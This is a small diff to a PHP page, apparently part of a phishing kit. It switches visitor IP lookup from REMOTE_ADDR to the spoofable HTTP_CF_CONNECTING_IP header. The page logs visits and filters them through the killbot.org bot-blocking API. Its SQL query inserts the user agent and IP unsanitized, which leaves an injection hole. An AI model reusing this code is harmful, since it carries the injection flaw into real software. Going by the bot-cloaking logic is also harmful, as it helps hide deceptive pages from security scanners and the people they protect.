@@ -40,7 +40,7 @@ if ($enable_antibots == "checked") {
 }
 session_start();
 
-$ip = $_SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $ua = $_SERVER['HTTP_USER_AGENT'];
 
 $query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
@@ -71,7 +71,7 @@ $error = '<p class="alert alert-error" role="alert" style="display: block">The e
 }
 
 if ($enable_killbot == "checked") {
-   $ip = $_SERVER['REMOTE_ADDR'];
+   $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $killbot_response = json_decode(file_get_contents("https://killbot.org/api/v2/blocker?apikey=$killbot_apikey&ip=$ip&ua=$ua&url="), true);
    if ($killbot_response['data']['block_access']) {
